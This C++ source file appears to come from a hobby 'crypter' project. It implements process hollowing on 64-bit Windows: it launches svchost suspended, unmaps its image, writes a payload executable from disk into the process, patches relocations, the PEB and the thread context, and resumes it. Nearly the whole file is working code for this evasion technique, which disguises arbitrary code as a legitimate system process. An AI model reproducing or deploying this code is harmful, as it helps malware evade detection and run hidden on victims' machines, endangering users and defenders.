// SomeAwesomePH.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <string>
#include <fstream>
#include "ProcessStructs.h"
#include "WinNT.h"
#include "windows.h"

std::shared_ptr<char[]> ReadFileBytes(std::shared_ptr<char[]> link)
{
    std::cout << "Reading file: " << link.get() << std::endl;

    // Open up the stream to read the bytes of the file
    std::ifstream sByteStream("C:/Users/AComputer/source/repos/SomethingAwesomeCrypter/SomeAwesomeStub/bin/x64/Debug/HelloWorld.exe", std::ios_base::binary);

    // Set the stream to point to the end of the stream
    sByteStream.seekg(0, sByteStream.end);
    size_t length = sByteStream.tellg();
    // Set the stream to point to the beginning of the stream
    sByteStream.seekg(0, sByteStream.beg);

    std::shared_ptr<char[]> pFileBuffer(new char[length]);

    // Read the bytes into the buffer.
    sByteStream.read(pFileBuffer.get(), length);
    return pFileBuffer;
}

void StartProcessHollowing(std::shared_ptr<char[]> pSourcePath)
{
    std::cout << "File To Inject: " << pSourcePath.get() << std::endl;

    // Let us prepare the image we want to inject.
    std::shared_ptr<char[]> pSourceImage = ReadFileBytes(pSourcePath);
    PIMAGE_DOS_HEADER pSourceDOSHeader = new IMAGE_DOS_HEADER();
    PIMAGE_NT_HEADERS64 pSourceNTHeader = new IMAGE_NT_HEADERS64();

    // Standard, start up the process to get the process start information
    std::unique_ptr<PROCESS_INFORMATION> pProcessInfo(new PROCESS_INFORMATION());
    std::unique_ptr<STARTUPINFOA> pStartupInfo(new STARTUPINFOA());

    pSourceDOSHeader = (PIMAGE_DOS_HEADER)pSourceImage.get();
    pSourceNTHeader = (PIMAGE_NT_HEADERS64)(pSourceImage.get() + pSourceDOSHeader->e_lfanew);

    const char* pDestCmdLine = "svchost";

    if (!CreateProcessA(
        NULL,
        (LPSTR)pDestCmdLine,
        NULL,
        NULL,
        NULL,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        pStartupInfo.get(),
        pProcessInfo.get()
    ))
    {
        std::cout << "Can not create the target process." << std::endl;
        return;
    }

    std::unique_ptr<CONTEXT> pContext(new CONTEXT());
    pContext->ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(
        pProcessInfo->hThread,
        pContext.get()
    ))
    {
        std::cout << "Can not get the target context." << std::endl;
        return;
    }

    std::unique_ptr<PEB> pPEB(new PEB());
    if (!ReadProcessMemory(
        pProcessInfo->hProcess,
        (LPCVOID)pContext->Rdx,
        pPEB.get(),
        sizeof(PEB),
        0
    ))
    {
        std::cout << "Can not get the PEB. Can not read the memory." << std::endl;
        return;
    }

    std::cout << "Process entry point: " << (void*)pContext->Rdx << std::endl;
    std::cout << "Process image base: " << pPEB->ImageBaseAddress << std::endl;

    std::cout << "Unmapping destination section" << std::endl;

    // Unmapping code retrieved from,
    // https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/internals.h
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection(pProcessInfo->hProcess,pPEB->ImageBaseAddress);
    if (dwResult)
    {
        std::cout << "Error unmapping section\r\n" << std::endl;
        return;
    }

    std::cout << "Remap the unmapped section to give us control." << std::endl;

    void* pMappedMemory = VirtualAllocEx(
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceNTHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Before we update, we need to check out what is the relocation delta
    ULONGLONG ullDelta = (ULONGLONG)pPEB->ImageBaseAddress - pSourceNTHeader->OptionalHeader.ImageBase;

    // Update the source image
    pSourceNTHeader->OptionalHeader.ImageBase = (ULONGLONG)pMappedMemory;

    // Time to map the headers to the newly mapped area.
    if (!WriteProcessMemory(
        pProcessInfo->hProcess,
        pMappedMemory,
        pSourceImage.get(),
        pSourceNTHeader->OptionalHeader.SizeOfHeaders,
        0
    ))
    {
        std::cout << "Cannot write the headers to the newly allocated area." << std::endl;
        return;
    }

    // Time to write the section headers
    PIMAGE_SECTION_HEADER pSourceSectionHeaders = 
        (PIMAGE_SECTION_HEADER)(pSourceImage.get() + 
                                pSourceDOSHeader->e_lfanew +
                                sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < pSourceNTHeader->FileHeader.NumberOfSections; i++)
    {
        if (!pSourceSectionHeaders[i].PointerToRawData) continue;

        PVOID pSectionDestination = (PVOID)((ULONGLONG)pMappedMemory + (ULONGLONG)pSourceSectionHeaders[i].VirtualAddress);
        LPCVOID pWriteMemory = (LPCVOID)(pSourceImage.get() + pSourceSectionHeaders[i].PointerToRawData);

        std::cout << "Writing " << pSourceSectionHeaders[i].Name << " section to 0x" << pSectionDestination << std::endl;
        std::cout << "Size: 0x" << (void*)pSourceSectionHeaders[i].SizeOfRawData << std::endl;
        std::cout << "Memory Location: " << pWriteMemory << std::endl;

        if (!WriteProcessMemory
        (
            pProcessInfo->hProcess,
            pSectionDestination,
            pWriteMemory,
            (size_t)pSourceSectionHeaders[i].SizeOfRawData,
            NULL
        ))
        {
            std::cout << "Error: " << GetLastError() << std::endl;
            std::cout << "Can not write to process memory!" << std::endl;
            return;
        }
    }

    // Now we need to check if we need to do any relocation
    // This entire relocation code is based off code by:
    // John Leitch at http://www.autosectools.com
    if (ullDelta)
    {
        for (int i = 0; i < pSourceNTHeader->FileHeader.NumberOfSections; i++)
        {
            const char* pSectionName = ".reloc";
            if (memcmp(pSourceSectionHeaders[i].Name, pSectionName, strlen(pSectionName)))
            {
                std::cout << "Skipping: " << pSourceSectionHeaders[i].Name << std::endl;
                continue;
            }

            ULONGLONG pRelocAddr = (ULONGLONG)pSourceSectionHeaders[i].PointerToRawData;
            ULONGLONG ullOffset = 0;

            IMAGE_DATA_DIRECTORY relocData = pSourceNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (ullOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)(pSourceImage.get() + pRelocAddr + ullOffset);
                ullOffset += sizeof(BASE_RELOCATION_BLOCK);
                ULONGLONG ullEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)(pSourceImage.get() + pRelocAddr + ullOffset);
                for (DWORD y = 0; y < ullEntryCount; y++)
                {
                    ullOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (pBlocks[y].Type == 0)
                        continue;

                    ULONGLONG ullFieldAddress = pBlockHeader->PageAddress + pBlocks[y].Offset;

                    ULONGLONG ullBuffer = 0;
                    ReadProcessMemory(
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + ullFieldAddress),
                        &ullBuffer,
                        sizeof(DWORD),
                        0
                    );

                    // std::cout << "Relocating 0x" << ullBuffer << " -> 0x" << ullBuffer - ullDelta << std::endl;

                    ullBuffer += ullDelta;

                    BOOL bSuccess = WriteProcessMemory(
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + ullFieldAddress),
                        &ullBuffer,
                        sizeof(DWORD),
                        0
                    );

                    if (!bSuccess)
                    {
                        printf("Error writing memory\r\n");
                        continue;
                    }
                }
            }
        }
    }

    // Update the PEB
    pPEB->ImageBaseAddress = pMappedMemory;
    if (!WriteProcessMemory
    (
        pProcessInfo->hProcess,
        (LPVOID)(pContext->Rdx + 8),
        pPEB.get(),
        sizeof(PEB),
        0
    ))
    {
        std::cout << "Can not write to PEB block!" << std::endl;
        return;
    }

    pContext->Rcx = ((DWORD64)pMappedMemory + (DWORD64)pSourceNTHeader->OptionalHeader.AddressOfEntryPoint);

    if (!SetThreadContext(pProcessInfo->hThread, pContext.get()))
    {
        std::cout << "Can not set the thread context." << std::endl;
        std::cout << "Error: " << GetLastError() << std::endl;
    }
    
    if (!ResumeThread(pProcessInfo->hThread))
    {
        std::cout << "Can not resume the thread." << std::endl;
        return;
    }

    std::cout << "Process Hollowing Complete" << std::endl;
}

int main()
{
    // We are going to try and link to the executable we want to inject
    std::shared_ptr<char[]> pFileName(new char[MAX_PATH]);
    GetModuleFileNameA(NULL, pFileName.get(), MAX_PATH);
    pFileName[strrchr(pFileName.get(), '\\') - pFileName.get() + 1] = 0;
    strcat_s(pFileName.get(), MAX_PATH, "a.exe");

    StartProcessHollowing(pFileName);

    system("pause");
    return 0;
}

